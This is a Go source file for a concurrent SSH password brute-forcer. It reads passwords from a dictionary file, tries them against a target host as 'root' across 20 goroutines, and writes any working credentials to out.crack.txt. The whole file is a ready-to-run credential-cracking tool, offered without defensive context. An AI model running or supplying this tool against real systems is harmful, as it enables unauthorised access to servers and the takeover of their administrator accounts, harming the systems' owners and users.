package main

import (
	"bufio"
	"golang.org/x/crypto/ssh"
	"log"
	"os"
	"strings"
	"sync"
)

var capacity = 20
var passchannel = make(chan string)
var w sync.WaitGroup

func readPassword(pf *bufio.Reader) {
	for {
		password, err := pf.ReadString('\n')
		password = strings.TrimRight(password, "\n")
		password = strings.TrimRight(password, "\r")
		if err != nil {
			close(passchannel)
			return
		}
		passchannel <- password
	}
}

func ssh_login(hostname string, username string) {
	for {
		password, more := <-passchannel
		if !more {
			w.Done()
			return
		}

		config := &ssh.ClientConfig{
			User: username,
			Auth: []ssh.AuthMethod{
				ssh.Password(password),
			},
		}

		if !strings.Contains(hostname, ":") {
			hostname += ":22"
		}

		_, err := ssh.Dial("tcp", hostname, config)
		f, _ := os.OpenFile("out.crack.txt", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0644)
		str := hostname + "\t" + config.User + "\t" + password
		if err != nil {
			str = "\033[33m[-] [Wrong] " + str + "\033[0m - " + err.Error()
			log.Println(str)
		} else {
			f.WriteString(str + "\n")
			log.Println("\033[32m[+] [Right] " + str + "\033[0m")
			break
		}
		f.Close()
	}
}

func main() {
	if len(os.Args) != 2 {
		log.Printf("Usage: %s hostname[:port]", os.Args[0])
		os.Exit(1)
	}

	hostname := os.Args[1]
	pf, err := os.Open("ref.password.dict")
	defer pf.Close()
	if err != nil {
		log.Println("Password dictionary file [ref.password.dict] is required.")
		os.Exit(1)
	}
	bf := bufio.NewReader(pf)
	go readPassword(bf)

	log.Println("scanning start!")
	for i := 0; i < capacity; i++ {
		w.Add(1)
		go ssh_login(hostname, "root")
	}

	w.Wait()
	log.Println("scan finished, no authorized password.")
}
